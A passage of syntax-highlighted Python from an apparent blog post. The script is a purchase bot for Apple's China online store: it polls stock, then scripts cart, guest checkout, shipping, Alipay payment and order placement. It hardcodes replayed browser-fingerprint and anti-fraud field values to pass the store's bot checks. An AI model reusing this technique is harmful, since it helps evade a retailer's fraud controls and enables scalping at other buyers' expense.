class=\"string\">\"未找到相应产品\\t%s\\t%s\\t%s\"</span>%(order[<span class=\"string\">'product'</span>],order[<span class=\"string\">'capacity'</span>],order[<span class=\"string\">'color'</span>]) )</div><div class=\"line\">                <span class=\"keyword\">return</span></div><div class=\"line\">            <span class=\"comment\"># close products.json</span></div><div class=\"line\">        <span class=\"keyword\">try</span>:</div><div class=\"line\">        <span class=\"comment\">#if True:</span></div><div class=\"line\">            <span class=\"comment\"># 验证是否启售</span></div><div class=\"line\">            <span class=\"keyword\">while</span> <span class=\"keyword\">True</span>:</div><div class=\"line\"></div><div class=\"line\">                <span class=\"comment\"># 重试方式，但太复杂，且用修饰器也并不好实现。</span></div><div class=\"line\">                <span class=\"comment\"># n = 0</span></div><div class=\"line\">                <span class=\"comment\"># while n&lt;retryTime:</span></div><div class=\"line\">                <span class=\"comment\">#     try:</span></div><div class=\"line\">                <span class=\"comment\">#         r=session.get(\"https://www.apple.com/cn/shop/delivery-message?parts.0=\"+currentProduct['partNumber'],timeout=reqTimeout)</span></div><div class=\"line\">                <span class=\"comment\">#         n = n + 10000       # 请求成功，跳出循环</span></div><div class=\"line\">                <span class=\"comment\">#     except Exception as e:</span></div><div class=\"line\">                <span class=\"comment\">#         n = n + 1</span></div><div class=\"line\">                <span class=\"comment\">#         if n&gt;=retryTime:</span></div><div class=\"line\">                <span class=\"comment\">#         print(\"重试次数过多！！！ &lt;退出&gt;\")</span></div><div class=\"line\">                <span class=\"comment\">#         return</span></div><div class=\"line\">                <span class=\"comment\"># end while</span></div><div class=\"line\">                order[<span class=\"string\">'remark'</span>]=<span class=\"string\">'出师未捷 :: '</span>+<span class=\"string\">\"https://www.apple.com/cn/shop/delivery-message?parts.0=\"</span>+currentProduct[<span class=\"string\">'partNumber'</span>]</div><div class=\"line\">                logging.debug(<span class=\"string\">\"\\n%s\\n\"</span>%currentProduct)</div><div class=\"line\">                r=session.get(<span class=\"string\">\"https://www.apple.com/cn/shop/delivery-message?parts.0=\"</span>+currentProduct[<span class=\"string\">'partNumber'</span>],timeout=retryTimeout)</div><div class=\"line\">                logging.debug(r.text)</div><div class=\"line\">                deliveryMsg = json.loads(r.text,encoding=<span class=\"string\">'utf-8'</span>)</div><div class=\"line\">                <span class=\"comment\">#print(orderIdentify+\"%s  %s\"%(deliveryMsg['body']['content']['deliveryMessage'][currentProduct['partNumber']]['orderByDeliveryBy'],deliveryMsg['body']['content']['deliveryMessage'][currentProduct['partNumber']]['deliveryOptionMessages']))</span></div><div class=\"line\"></div><div class=\"line\">                <span class=\"keyword\">if</span> <span class=\"string\">'未发售'</span> <span class=\"keyword\">in</span> deliveryMsg[<span class=\"string\">'body'</span>][<span class=\"string\">'content'</span>][<span class=\"string\">'deliveryMessage'</span>][currentProduct[<span class=\"string\">'partNumber'</span>]][<span class=\"string\">'deliveryOptionMessages'</span>][<span class=\"number\">0</span>] :</div><div class=\"line\">                    print(orderIdentify+currentProduct[<span class=\"string\">'seoUrlToken'</span>]+<span class=\"string\">\" || 暂未发售\"</span>)</div><div class=\"line\">                    time.sleep(<span class=\"number\">3</span>)   <span class=\"comment\"># 隔三秒钟</span></div><div class=\"line\">                <span class=\"keyword\">else</span>:</div><div class=\"line\">                    print(orderIdentify+deliveryMsg[<span class=\"string\">'body'</span>][<span class=\"string\">'content'</span>][<span class=\"string\">'deliveryMessage'</span>][currentProduct[<span class=\"string\">'partNumber'</span>]][<span class=\"string\">'orderByDeliveryBy'</span>]+deliveryMsg[<span class=\"string\">'body'</span>][<span class=\"string\">'content'</span>][<span class=\"string\">'deliveryMessage'</span>][currentProduct[<span class=\"string\">'partNumber'</span>]][<span class=\"string\">'deliveryOptionMessages'</span>][<span class=\"number\">0</span>])</div><div class=\"line\">                    <span class=\"keyword\">break</span>       <span class=\"comment\"># 起售！！！   跳出while死循环</span></div><div class=\"line\"></div><div class=\"line\">            <span class=\"comment\"># 添加购物车</span></div><div class=\"line\">            addCartUrl=url+<span class=\"string\">\"/\"</span>+currentProduct[<span class=\"string\">'seoUrlToken'</span>]+<span class=\"string\">\"?product=\"</span>+currentProduct[<span class=\"string\">'partNumber'</span>]    \\</div><div class=\"line\">                        +<span class=\"string\">\"&amp;purchaseOption=fullPrice\"</span>                                    \\</div><div class=\"line\">                        +<span class=\"string\">\"&amp;step=select\"</span>                                                 \\</div><div class=\"line\">                        +<span class=\"string\">\"&amp;dimensionCapacity=\"</span>+currentProduct[<span class=\"string\">'dimensionCapacity'</span>]      \\</div><div class=\"line\">                        +<span class=\"string\">\"&amp;dimensionColor=\"</span>+currentProduct[<span class=\"string\">'dimensionColor'</span>]            \\</div><div class=\"line\">                        +<span class=\"string\">\"&amp;part=\"</span>+currentProduct[<span class=\"string\">'part'</span>]                                \\</div><div class=\"line\">                        +<span class=\"string\">\"&amp;complete=true\"</span>                                               \\</div><div class=\"line\">                        +<span class=\"string\">\"&amp;dimensionScreensize=\"</span>+currentProduct[<span class=\"string\">'dimensionScreensize'</span>]  \\</div><div class=\"line\">                        +<span class=\"string\">\"&amp;add-to-cart=add-to-cart\"</span></div><div class=\"line\">            print(orderIdentify+<span class=\"string\">\"添加到购物车[GET] :: %s\"</span>%addCartUrl[:<span class=\"number\">80</span>])</div><div class=\"line\">            r = session.get(addCartUrl,timeout=retryTimeout)</div><div class=\"line\">            </div><div class=\"line\">            <span class=\"comment\">#pdb.set_trace()</span></div><div class=\"line\">            <span class=\"comment\"># 访问购物车</span></div><div class=\"line\">            shopBagUrl=<span class=\"string\">\"https://www.apple.com/cn/shop/bag\"</span></div><div class=\"line\">            print(orderIdentify+<span class=\"string\">\"访问购物车[GET] :: %s\"</span>%shopBagUrl[:<span class=\"number\">80</span>])</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[失败]访问购物车 :: %s\"</span>%shopBagUrl</div><div class=\"line\">            r = session.get(shopBagUrl,timeout=retryTimeout)</div><div class=\"line\">            </div><div class=\"line\">            token=re.search(<span class=\"string\">r'\\\"x-aos-stk\\\":\\\"(.*?)\\\"'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            <span class=\"comment\"># requests.utils.add_dict_to_cookiejar(session.cookies,&#123;\"x-aos-stk\":token&#125;)   # 此语句是将token添加到cookie.</span></div><div class=\"line\"></div><div class=\"line\">            <span class=\"comment\"># 修改数量  可修改为2      此处cookie中需要携带x-aos-stk，应该类似于token的作用。    # 应该可以省略！！！！！ 在结账步骤可一同实现。</span></div><div class=\"line\">            <span class=\"comment\"># tmp=re.search(r'\"updateQuantity\":&#123;\"url\":\"(/cn/shop/bagx\\?_a=updateQuantity&amp;_m=(shoppingCart.items.item-.*?))\"',r.text)</span></div><div class=\"line\">            <span class=\"comment\"># updateQuantityUrl=\"https://www.apple.com\"+tmp.group(1)</span></div><div class=\"line\">            <span class=\"comment\"># if order['quantity']=='2':</span></div><div class=\"line\">            <span class=\"comment\">#     r= session.post(updateQuantityUrl,data=&#123;tmp.group(2)+\".quantity\":\"2\"&#125;,headers=&#123;\"x-aos-stk\":token&#125;,timeout=reqTimeout)</span></div><div class=\"line\">                </div><div class=\"line\">            <span class=\"comment\">#     #pdb.set_trace()</span></div><div class=\"line\">            <span class=\"comment\">#     print()</span></div><div class=\"line\">            </div><div class=\"line\">            <span class=\"comment\"># 结账</span></div><div class=\"line\">            tmp=re.search(<span class=\"string\">r'\\\"updateQuantity\\\":&#123;\\\"url\\\":\\\"(/cn/shop/bagx\\?_a=updateQuantity&amp;_m=(shoppingCart.items.item-.*?))\\\"'</span>,r.text)</div><div class=\"line\">            checkoutUrl=<span class=\"string\">\"https://www.apple.com/cn/shop/bagx/checkout_now?_a=checkout&amp;_m=shoppingCart\"</span></div><div class=\"line\">            print(orderIdentify+<span class=\"string\">\"结账[POST] :: %s\"</span>%checkoutUrl[:<span class=\"number\">80</span>])</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[失败]结账[POST] :: %s\"</span>%checkoutUrl</div><div class=\"line\">            r= session.post(checkoutUrl,data=&#123;tmp.group(<span class=\"number\">2</span>)+<span class=\"string\">\".quantity\"</span>:order[<span class=\"string\">'quantity'</span>],<span class=\"string\">'shoppingCart.actions.fcscounter'</span>:<span class=\"string\">'NaN'</span>,<span class=\"string\">'shoppingCart.actions.fcsdata'</span>:<span class=\"string\">''</span>&#125;,headers=&#123;<span class=\"string\">\"x-aos-stk\"</span>:token&#125;,timeout=retryTimeout)</div><div class=\"line\">            </div><div class=\"line\">            <span class=\"comment\">#pdb.set_trace()</span></div><div class=\"line\">            signinUrl=json.loads(r.text,encoding=<span class=\"string\">'utf-8'</span>)[<span class=\"string\">'head'</span>][<span class=\"string\">'data'</span>][<span class=\"string\">'url'</span>]</div><div class=\"line\">            print(orderIdentify+<span class=\"string\">\"登录页面[GET] :: %s\"</span>%signinUrl[:<span class=\"number\">80</span>])</div><div class=\"line\"></div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[失败]登录页面[GET] :: %s\"</span>%signinUrl</div><div class=\"line\">            r=session.get(signinUrl,timeout=retryTimeout)</div><div class=\"line\">            </div><div class=\"line\">            guestBuyData=re.search(<span class=\"string\">r'\\\"signInGuest\\\":\\&#123;\\\"form\\\":\\\"login\\._forms\\.guestCheckoutForm\\\",\\\"url\\\":\\\"/cn/shop/sentryx/sign_in\\?(_a=login\\.guestSign.*?)\\\"'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            </div><div class=\"line\">            tmp = re.findall(<span class=\"string\">r'(.*?=.*?)&amp;'</span>,guestBuyData+<span class=\"string\">\"&amp;\"</span>)</div><div class=\"line\">            data=&#123;&#125;</div><div class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> tmp:</div><div class=\"line\">                data[i.split(<span class=\"string\">\"=\"</span>,maxsplit=<span class=\"number\">1</span>)[<span class=\"number\">0</span>]]=i.split(<span class=\"string\">\"=\"</span>,maxsplit=<span class=\"number\">1</span>)[<span class=\"number\">1</span>]</div><div class=\"line\">            </div><div class=\"line\">            <span class=\"comment\"># 两个复杂参数，硬编码！  </span></div><div class=\"line\">            data[<span class=\"string\">'aywysya'</span>]=<span class=\"string\">'78a44j1d7lY5BNvcKyAdMUDFBpBeA0fUm7qKFz0XnjYrJFW73AuyPBB2SCVMvsD7z5meTuCUMz_WgpMVQdgGgeVjrkRGjftckcKyAd65hz74WySXvO3wa3wL6tqAhbrmQkLNbfyz.sU7zl998tp7ppeZLz77qZoOSix5ezdstlYrMxy0kyMpwoNLTK9Ly9nOVlQtb_GGEOpBSKxUC56MnGWpwoNSUC53ZXnN87gq1aWuxXVvHe9FjpidPNs0ojpVMZ90L5H6fqUdHz15tTma1eWNieLqDxpHrk0ugN.xL438IXkb9CxN4t1VKWZWudUd.z9euVrAqJkJgghmeugN.VHBQLz4mvmfTT9oaSumKkpjlRiwerbXh8bUudQUhkY5BSmmY5BNkOdhs7GY6Mk.BY8'</span></div><div class=\"line\">            data[<span class=\"string\">'fdcBrowserData'</span>]=<span class=\"string\">'%257B%2522U%2522%253A%2522Mozilla%252F5.0%2520(Windows%253B%2520U%253B%2520Windows%2520NT%25206.1%253B%2520zh-CN)%2520AppleWebKit%252F533%252B%2520(KHTML%252C%2520like%2520Gecko)%2522%252C%2522L%2522%253A%2522zh-CN%2522%252C%2522Z%2522%253A%2522GMT%252B08%253A00%2522%252C%2522V%2522%253A%25221.0%2522%257D'</span></div><div class=\"line\">            tmpUrl = re.search(<span class=\"string\">r'(https:\\/\\/secure.?\\.store\\.apple\\.com)\\/cn\\/shop\\/'</span>,r.text).group(<span class=\"number\">1</span>)+<span class=\"string\">'/cn/shop/sentryx/sign_in'</span></div><div class=\"line\">            logging.debug(<span class=\"string\">\"访客结账[POST] :: %s\"</span>%tmpUrl)</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[失败]访客结账[POST] :: %s\"</span>%tmpUrl</div><div class=\"line\">            r = session.post(tmpUrl,data=data,timeout=retryTimeout)</div><div class=\"line\">            </div><div class=\"line\">            pltn = json.loads(r.text,encoding=<span class=\"string\">'utf-8'</span>)[<span class=\"string\">'head'</span>][<span class=\"string\">'data'</span>][<span class=\"string\">'args'</span>][<span class=\"string\">'pltn'</span>]</div><div class=\"line\">            checkoutStartUrl = json.loads(r.text,encoding=<span class=\"string\">'utf-8'</span>)[<span class=\"string\">'head'</span>][<span class=\"string\">'data'</span>][<span class=\"string\">'url'</span>]</div><div class=\"line\"></div><div class=\"line\">            logging.debug(<span class=\"string\">\"结账跳转-1 [POST] :: %s\"</span>%checkoutStartUrl)</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[失败]结账跳转-1 [POST] :: %s\"</span>%checkoutStartUrl</div><div class=\"line\">            r = session.post(checkoutStartUrl,data=&#123;<span class=\"string\">'pltn'</span>:pltn&#125;,timeout=retryTimeout)</div><div class=\"line\">            </div><div class=\"line\">            data=&#123;&#125;</div><div class=\"line\">            checkoutUrl = re.search(<span class=\"string\">r'&lt;form method=\\\"POST\\\" name=\\\"redirector\\\" action=\\\"(https://.*?)\\\"'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            data[<span class=\"string\">'pltn'</span>] = re.search(<span class=\"string\">r'&lt;input name=\"pltn\" type=\"\\w*?\" value=\"(.*?)\"'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            data[<span class=\"string\">'v'</span>] = re.search(<span class=\"string\">r'&lt;input name=\"v\" type=\"\\w*?\" value=\"(.*?)\"'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            data[<span class=\"string\">'sessionID'</span>] = re.search(<span class=\"string\">r'&lt;input name=\"sessionID\" type=\"\\w*?\" value=\"(.*?)\"'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            logging.debug(<span class=\"string\">\"结账跳转-2 [POST] :: %s\"</span>%checkoutUrl)</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[失败]结账跳转-2 [POST] :: %s\"</span>%checkoutUrl</div><div class=\"line\">            r = session.post(checkoutUrl,data=data,timeout=retryTimeout)</div><div class=\"line\">            </div><div class=\"line\">            <span class=\"comment\"># 送货选项 --&gt; 送货地址</span></div><div class=\"line\">            data=&#123;&#125;</div><div class=\"line\">            data[<span class=\"string\">'sessionID'</span>]=re.search(<span class=\"string\">r'\\&#123;\\\"name\\\":\\\"sessionID\\\",\\\"value\\\":\\\"(.*?)\\\"\\&#125;'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            <span class=\"comment\"># data['A8']=re.search(r',\"deliveryLocationType\":\"(.*?)\",\"_forms\":&#123;\"main\":&#123;\"fields\":\\[&#123;\"id\":\"(cart-item-.*?deliveryLocationType)\",',r.text).group(1)</span></div><div class=\"line\">            <span class=\"comment\"># data['cartItem']=re.search(r',\"deliveryLocationType\":\"(.*?)\",\"_forms\":&#123;\"main\":&#123;\"fields\":\\[&#123;\"id\":\"(cart-item-.*?deliveryLocationType)\",',r.text).group(2)</span></div><div class=\"line\">            <span class=\"comment\">#data[re.search(r'\\\"id\\\":\\\"(cart-item-.*?deliveryLocationType)\\\",',r.text).group(1)]='A8'   # 2017-10-26发现该正则表达式存在匹配问题,匹配了超长的字符串</span></div><div class=\"line\">            data[re.search(<span class=\"string\">r'(cart-item-([0-9A-z]+-)&#123;5&#125;delivery-deliveryLocationType)'</span>,r.text).group(<span class=\"number\">1</span>)]=<span class=\"string\">'A8'</span></div><div class=\"line\">            </div><div class=\"line\">            data[<span class=\"string\">'_a'</span>]=<span class=\"string\">'cart.cont'</span></div><div class=\"line\">            data[<span class=\"string\">'_fid'</span>]=<span class=\"string\">'co'</span></div><div class=\"line\">            data[<span class=\"string\">'_m'</span>]=<span class=\"string\">'cart'</span></div><div class=\"line\">            <span class=\"comment\"># 有多台secure主机，需要从页面取值。</span></div><div class=\"line\">            checkoutxUrl = re.search(<span class=\"string\">r'(https:\\/\\/secure.?\\.store\\.apple\\.com)\\/cn\\/shop\\/'</span>,r.text).group(<span class=\"number\">1</span>)+<span class=\"string\">'/cn/shop/checkoutx'</span></div><div class=\"line\">            print(orderIdentify+<span class=\"string\">\"送货选项 --&gt; 送货地址[POST] :: %s\"</span>%checkoutxUrl[:<span class=\"number\">80</span>])</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[失败]送货选项 --&gt; 送货地址[POST] :: %s\"</span>%checkoutxUrl</div><div class=\"line\">            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout)</div><div class=\"line\">            </div><div class=\"line\">            <span class=\"comment\"># 送货地址 --&gt; 付款</span></div><div class=\"line\">            data=&#123;&#125;</div><div class=\"line\">            data[<span class=\"string\">'sessionID'</span>] = re.search(<span class=\"string\">r'\\&#123;\\\"name\\\":\\\"sessionID\\\",\\\"value\\\":\\\"(.*?)\\\"\\&#125;'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            data[<span class=\"string\">'shipping-user-lastName'</span>] = order[<span class=\"string\">'lastName'</span>]</div><div class=\"line\">            data[<span class=\"string\">'shipping-user-firstName'</span>] = order[<span class=\"string\">'firstName'</span>]</div><div class=\"line\">            data[<span class=\"string\">'shipping-user-daytimePhoneAreaCode'</span>] = <span class=\"string\">'0'</span></div><div class=\"line\">            data[<span class=\"string\">'shipping-user-daytimePhone'</span>] = order[<span class=\"string\">'phone'</span>]</div><div class=\"line\">            data[<span class=\"string\">'shipping-user-state'</span>] = order[<span class=\"string\">'state'</span>]</div><div class=\"line\">            data[<span class=\"string\">'shipping-user-city'</span>] = order[<span class=\"string\">'city'</span>]</div><div class=\"line\">            data[<span class=\"string\">'shipping-user-district'</span>] = order[<span class=\"string\">'district'</span>]</div><div class=\"line\">            data[<span class=\"string\">'shipping-user-street'</span>] = order[<span class=\"string\">'street'</span>]</div><div class=\"line\">            data[<span class=\"string\">'shipping-user-street2'</span>] = <span class=\"string\">''</span></div><div class=\"line\">            data[<span class=\"string\">'shipping-user-postalCode'</span>] = <span class=\"string\">''</span></div><div class=\"line\">            data[<span class=\"string\">'shipping-user-emailAddress'</span>] = order[<span class=\"string\">'email'</span>]</div><div class=\"line\">            data[<span class=\"string\">'shipping-user-mobilePhone'</span>] = order[<span class=\"string\">'phone'</span>]</div><div class=\"line\">            data[<span class=\"string\">'state'</span>] = order[<span class=\"string\">'state'</span>]</div><div class=\"line\">            data[<span class=\"string\">'keyPath'</span>] = <span class=\"string\">'shipping.address'</span></div><div class=\"line\">            data[<span class=\"string\">'city'</span>] = order[<span class=\"string\">'city'</span>]</div><div class=\"line\">            data[<span class=\"string\">'_a'</span>] = <span class=\"string\">'ship.cont'</span></div><div class=\"line\">            data[<span class=\"string\">'_fid'</span>] = <span class=\"string\">'co'</span></div><div class=\"line\"></div><div class=\"line\">            print(orderIdentify+<span class=\"string\">\"送货地址 --&gt; 付款[POST] :: %s\"</span>%checkoutxUrl[:<span class=\"number\">80</span>])</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[失败]送货地址 --&gt; 付款[POST] :: %s\"</span>%checkoutxUrl</div><div class=\"line\">            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout)</div><div class=\"line\">            </div><div class=\"line\">            <span class=\"comment\"># 付款 --&gt; 发票</span></div><div class=\"line\">            data=&#123;&#125;</div><div class=\"line\">            data[<span class=\"string\">'sessionID'</span>] = re.search(<span class=\"string\">r'\\&#123;\\\"name\\\":\\\"sessionID\\\",\\\"value\\\":\\\"(.*?)\\\"\\&#125;'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            data[<span class=\"string\">'undefined'</span>] = <span class=\"string\">''</span></div><div class=\"line\">            data[<span class=\"string\">'bankOption'</span>] = <span class=\"string\">'Alipay'</span></div><div class=\"line\">            data[<span class=\"string\">'_a'</span>] = <span class=\"string\">'bill.cont'</span></div><div class=\"line\">            data[<span class=\"string\">'_fid'</span>] = <span class=\"string\">'co'</span></div><div class=\"line\"></div><div class=\"line\">            print(orderIdentify+<span class=\"string\">\"付款 --&gt; 发票[POST] :: %s\"</span>%checkoutxUrl[:<span class=\"number\">80</span>])</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[失败]付款 --&gt; 发票[POST] :: %s\"</span>%checkoutxUrl</div><div class=\"line\">            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout)</div><div class=\"line\">            </div><div class=\"line\">            <span class=\"comment\"># 发票 --&gt; 账户</span></div><div class=\"line\">            data=&#123;&#125;</div><div class=\"line\">            data[<span class=\"string\">'invoice-user-invoiceEmailAddress-emailAddress'</span>] = order[<span class=\"string\">'email'</span>]</div><div class=\"line\">            data[<span class=\"string\">'invoice-fapiao-invoiceHeader'</span>] = order[<span class=\"string\">'lastName'</span>]+order[<span class=\"string\">'firstName'</span>]</div><div class=\"line\">            data[<span class=\"string\">'invoice-fapiao-taxPayerId'</span>] = <span class=\"string\">''</span></div><div class=\"line\">            data[<span class=\"string\">'invoice-form-options-selection'</span>] = <span class=\"string\">'personal'</span></div><div class=\"line\">            data[<span class=\"string\">'sessionID'</span>] = re.search(<span class=\"string\">r'\\&#123;\\\"name\\\":\\\"sessionID\\\",\\\"value\\\":\\\"(.*?)\\\"\\&#125;'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            data[<span class=\"string\">'invoice-user-invoiceDeliveryAddress-lastName'</span>] = order[<span class=\"string\">'lastName'</span>]</div><div class=\"line\">            data[<span class=\"string\">'invoice-user-invoiceDeliveryAddress-firstName'</span>] = order[<span class=\"string\">'firstName'</span>]</div><div class=\"line\">            data[<span class=\"string\">'invoice-user-invoiceDeliveryAddress-daytimePhoneAreaCode'</span>] = <span class=\"string\">'0'</span></div><div class=\"line\">            data[<span class=\"string\">'invoice-user-invoiceDeliveryAddress-daytimePhone'</span>] = order[<span class=\"string\">'phone'</span>]</div><div class=\"line\">            data[<span class=\"string\">'invoice-user-invoiceDeliveryAddress-companyName'</span>] = <span class=\"string\">''</span></div><div class=\"line\">            data[<span class=\"string\">'invoice-user-invoiceDeliveryAddress-state'</span>] = order[<span class=\"string\">'state'</span>]</div><div class=\"line\">            data[<span class=\"string\">'invoice-user-invoiceDeliveryAddress-city'</span>] = order[<span class=\"string\">'city'</span>]</div><div class=\"line\">            data[<span class=\"string\">'invoice-user-invoiceDeliveryAddress-district'</span>] = order[<span class=\"string\">'district'</span>]</div><div class=\"line\">            data[<span class=\"string\">'invoice-user-invoiceDeliveryAddress-street'</span>] = order[<span class=\"string\">'street'</span>]</div><div class=\"line\">            data[<span class=\"string\">'invoice-user-invoiceDeliveryAddress-street2'</span>] = <span class=\"string\">''</span></div><div class=\"line\">            data[<span class=\"string\">'invoice-user-invoiceDeliveryAddress-postalCode'</span>] = <span class=\"string\">''</span></div><div class=\"line\">            data[<span class=\"string\">'state'</span>] = order[<span class=\"string\">'state'</span>]</div><div class=\"line\">            data[<span class=\"string\">'keyPath'</span>] = <span class=\"string\">'invoice.invoiceDeliveryAddress'</span></div><div class=\"line\">            data[<span class=\"string\">'city'</span>] = order[<span class=\"string\">'city'</span>]</div><div class=\"line\">            data[<span class=\"string\">'_a'</span>] = <span class=\"string\">'invoice.cont'</span></div><div class=\"line\">            data[<span class=\"string\">'_fid'</span>] = <span class=\"string\">'co'</span></div><div class=\"line\"></div><div class=\"line\">            print(orderIdentify+<span class=\"string\">\"发票 --&gt; 账户[POST] :: %s\"</span>%checkoutxUrl[:<span class=\"number\">80</span>])</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[失败]发票 --&gt; 账户[POST] :: %s\"</span>%checkoutxUrl</div><div class=\"line\">            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout)</div><div class=\"line\">            </div><div class=\"line\">            <span class=\"comment\"># 账户 --&gt; 条款与条件</span></div><div class=\"line\">            data = &#123;&#125;</div><div class=\"line\">            data[<span class=\"string\">'account-appleId'</span>] = <span class=\"string\">''</span></div><div class=\"line\">            data[<span class=\"string\">'account-password'</span>] = <span class=\"string\">''</span></div><div class=\"line\">            data[<span class=\"string\">'account-passwordAgain'</span>] = <span class=\"string\">''</span></div><div class=\"line\">            data[<span class=\"string\">'account-commsPref'</span>] = <span class=\"string\">'false'</span></div><div class=\"line\">            data[<span class=\"string\">'_a'</span>] = <span class=\"string\">'acct.cont'</span></div><div class=\"line\">            data[<span class=\"string\">'_fid'</span>] = <span class=\"string\">'co'</span></div><div class=\"line\"></div><div class=\"line\">            print(orderIdentify+<span class=\"string\">\"账户 --&gt; 条款与条件[POST] :: %s\"</span>%checkoutxUrl[:<span class=\"number\">80</span>])</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[失败]账户 --&gt; 条款与条件[POST] :: %s\"</span>%checkoutxUrl</div><div class=\"line\">            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout)</div><div class=\"line\">            <span class=\"comment\"># 同意 条款与条件</span></div><div class=\"line\">            data = &#123;&#125;</div><div class=\"line\">            data[<span class=\"string\">'sessionID'</span>] = re.search(<span class=\"string\">r'\\&#123;\\\"name\\\":\\\"sessionID\\\",\\\"value\\\":\\\"(.*?)\\\"\\&#125;'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            data[<span class=\"string\">'accept'</span>] = <span class=\"string\">'true'</span></div><div class=\"line\">            data[<span class=\"string\">'acceptAppleTnc'</span>] = <span class=\"string\">'false'</span></div><div class=\"line\">            data[<span class=\"string\">'_a'</span>] = <span class=\"string\">'terms.cont'</span></div><div class=\"line\">            data[<span class=\"string\">'_fid'</span>] = <span class=\"string\">'co'</span></div><div class=\"line\"></div><div class=\"line\">            print(orderIdentify+<span class=\"string\">\"同意 条款与条件[POST] :: %s\"</span>%checkoutxUrl[:<span class=\"number\">80</span>])</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[失败]同意 条款与条件[POST] :: %s\"</span>%checkoutxUrl</div><div class=\"line\">            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout)</div><div class=\"line\">            </div><div class=\"line\">            <span class=\"comment\"># 下订单</span></div><div class=\"line\">            data=&#123;&#125;</div><div class=\"line\">            data[<span class=\"string\">'aywysya'</span>] = <span class=\"string\">'F8a44j1d7lY5BNvcKyAdMUDFBpBeA0fUm7qKFz0XnjYrJFW73AuyPBB2SCVMvsD7z5meTuCUMz_WgpMVQdgGgeVjrkRGjftckcKyAd65hz74WySXvO3wa3wL6tqAhbrmQkLNbfyz.sU7zl998tp7ppeZLz77qZoOSix5ezdstlYrMxy0kyMpwoNLTK9Ly8nOVlQtb_GGEOpBSKxUC56MnGWpwoNSUC53ZXnN87gq1aWux_5ukV_AAUfSHolk2dUf.j7J1gBZEMgzH_y3Cmx_B4K1lSJhgSv_KU.6elV2pNJF_DA1RcrpVMZ90L5H6e0z1_yc4p0iMgdVdOOQ_KpNk0.ZNqhyA_r_LwwKdBvpZfWfUXtStKjE4PIDzpHqzQW5BNv__5BNlVnIQkFY5DjV.4v2'</span></div><div class=\"line\">            data[<span class=\"string\">'sessionID'</span>] = re.search(<span class=\"string\">r'\\&#123;\\\"name\\\":\\\"sessionID\\\",\\\"value\\\":\\\"(.*?)\\\"\\&#125;'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            data[<span class=\"string\">'promo-code'</span>] = <span class=\"string\">''</span></div><div class=\"line\">            data[<span class=\"string\">'_a'</span>] = <span class=\"string\">'po'</span></div><div class=\"line\">            data[<span class=\"string\">'_fid'</span>] = <span class=\"string\">'co'</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">            print(orderIdentify+<span class=\"string\">\"下订单[POST] :: %s\"</span>%checkoutxUrl[:<span class=\"number\">80</span>])</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[存疑]下订单[POST] :: %s\"</span>%checkoutxUrl</div><div class=\"line\">            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout*<span class=\"number\">2</span>)       <span class=\"comment\"># 此处timeout时间加倍</span></div><div class=\"line\">            </div><div class=\"line\">            <span class=\"comment\"># 订单状态</span></div><div class=\"line\">            </div><div class=\"line\">            <span class=\"comment\">#checkoutStatusUrl = re.search(r'(https:\\/\\/.*?\\.apple\\.com)',checkoutxUrl).group(1)+json.loads(r.text,encoding='utf-8')['head']['data']['url']  </span></div><div class=\"line\">            checkoutStatusUrl = re.search(<span class=\"string\">r'(https:\\/\\/.*?\\.apple\\.com)'</span>,r.url).group(<span class=\"number\">1</span>)+re.search(<span class=\"string\">r'\\\"url\\\":\\\"(.*?)\\\"'</span>,r.text).group(<span class=\"number\">1</span>)</div><div class=\"line\">            order[<span class=\"string\">'remark'</span>]=<span class=\"string\">\"[存疑]订单状态-0 :: %s\"</span>%tmpUrl</div><div class=\"line\">            r = session.get(checkoutStatusUrl,timeout=retryTimeout)</div><div class=\"line\"></div><div class=\"line\">            data=&#123;&#125;</div><div class=\"line\">            data[<span class=\"string\">'_a'</span>]=<span class=\"string\">'status'</span></div><div class=\"line\">            data[<span class=\"string\">'_fid'</span>]=<span class=\"string\">'co'</span></div><div class=\"line\">            data[<span class=\"string\">'_m'</span>]=<span class=\"string\">'commo'</span></div><div class=\"line\">            tmpUrl = re.search(<span class=\"string\">r'(https:\\/\\/secure.?\\.store\\.apple\\.com)\\/cn\\/shop\\/'</span>,r.text).group(<span class=\"number\">1</span>)+<span class=\"string\">'/cn/shop/checkoutx/status'</span></div><div class=\"line\"></div><div class=\"line\">            order[<span 